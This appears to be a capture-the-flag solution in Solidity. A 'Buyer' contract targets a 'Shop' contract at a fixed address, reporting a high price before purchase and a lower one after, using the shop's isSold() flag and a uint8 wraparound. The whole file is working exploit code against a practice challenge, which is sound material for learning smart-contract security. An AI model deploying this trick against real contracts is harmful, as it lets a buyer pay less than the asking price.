// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IShop{
    function buy() external;
    function isSold() external view returns(bool);
}

contract Buyer{
    uint8 pr = 255;

    IShop shop = IShop(0x34379C79DA2E4C702795f6f93A1C75950Dd232C8);
    
    function price() external view returns (uint){
        bool isSold = shop.isSold();
        if(!isSold){
            return pr;
        }else{
            return pr+2;
        }
    }

    function attack() external{
        shop.buy();
    }
}